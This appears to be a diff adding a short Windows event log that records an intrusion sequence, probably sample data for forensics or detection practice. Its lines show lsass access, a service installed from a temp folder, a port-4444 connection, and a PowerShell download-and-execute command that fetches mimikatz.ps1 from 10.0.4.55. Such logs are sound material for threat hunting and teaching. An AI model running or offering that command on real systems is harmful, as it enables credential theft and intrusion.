@@ -1,0 +1,6 @@
+2026-04-17 19:15:02 [SYSTEM] EventID: 4624 | Logon Type: 3 | User: SVC_BACKUP | Source IP: 10.0.4.55
+2026-04-17 19:15:05 [SYSMON] EventID: 1 | Image: C:\Windows\System32\cmd.exe | ParentImage: wsmprovhost.exe | Command: whoami /priv
+2026-04-17 19:15:10 [SYSMON] EventID: 10 | SourceImage: C:\Windows\System32\cmd.exe | TargetImage: lsass.exe | Access: 0x1410
+2026-04-17 19:15:12 [POWERSHELL] Script Block Logging - EventID: 4104 | Script: IEX (New-Object Net.WebClient).DownloadString('http://10.0.4.55/mimikatz.ps1')
+2026-04-17 19:16:01 [SYSTEM] EventID: 7045 | Service Name: PwSvc | Image Path: C:\Windows\Temp\pws.exe | User: NT AUTHORITY\SYSTEM
+2026-04-17 19:16:20 [NETWORK] Connection Established: Local: 10.0.4.12:4444 -> Remote: 10.0.4.55:8080 | Protocol: TCP
